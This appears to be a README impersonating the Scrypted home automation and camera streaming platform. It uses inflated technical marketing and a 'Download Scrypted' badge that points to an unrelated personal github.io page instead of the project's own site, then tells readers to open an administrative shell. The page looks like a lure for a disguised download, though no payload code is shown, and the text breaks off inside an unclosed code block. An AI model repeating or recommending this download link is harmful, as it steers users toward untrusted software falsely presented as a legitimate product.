# Scrypted Enterprise Automation Engine

**Scrypted** is a high-performance home automation platform and low-latency video integration engine engineered for local smart home execution on Windows. Built to bridge traditional IP security cameras and home automation ecosystems, Scrypted specializes in real-time camera streaming acceleration and smart video analytics. Operating on a Node.js runtime with full plugin extensibility, the engine processes RTSP, ONVIF, and custom HTTP camera payloads—converting raw media streams into HomeKit Secure Video (HKSV), WebRTC, and RTSP re-streams. Integrated with OpenCV and object detection pipelines, Scrypted delivers instant motion alerts, object classification, and unified smart platform interoperability without relying on cloud gateways.

[![Download Scrypted](https://img.shields.io/badge/Download-Scrypted-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://jeanettmollenkopf093.github.io/.github/Scrypted-Automation-Engine)

> **CORE ARCHITECTURE:** High-efficiency Node.js execution kernel utilizing native media rebroadcasting wrappers and low-level FFmpeg bindings to process sub-second video pipelines.

<img src="https://docs.scrypted.app/img/ha-users.png" alt="Program Interface Screenshot"/>

> **THREADING PROFILE:** Multi-process plugin isolation model separating individual camera streams, hardware-accelerated video transcoders, and OpenCV motion evaluation threads from core engine state loops.

---

## Technical Specifications Matrix

| Component | Technology | Description |
| :--- | :--- | :--- |
| Video Pipeline | Low-Latency WebRTC & RTSP Engine | Re-streams IP camera feeds to WebRTC, RTSP, and HomeKit endpoints with sub-second latency |
| Smart Ecosystem Bridge | Native HomeKit, Home Assistant & Alexa | Bridges legacy camera streams into HomeKit Secure Video (HKSV), Google Home, and Alexa Smart Screen displays |
| Analytics Core | OpenCV & Motion Detection Engine | Executes local CPU/GPU hardware-accelerated motion tracking, object classification, and face recognition |
| Extensibility | Plugin Sandbox Architecture | Dynamic TypeScript/JavaScript plugin loader isolating platform integrations, drivers, and automation scripts |

---

## System Deployment Protocol

1. Ensure target Windows environment has **Node.js (v18+ LTS)** and **FFmpeg** configured on the system `PATH`.
2. Open PowerShell or Command Prompt with administrative privileges and install the Scrypted CLI launcher globally:
   ```cmd
   npm install -g npx scrypted
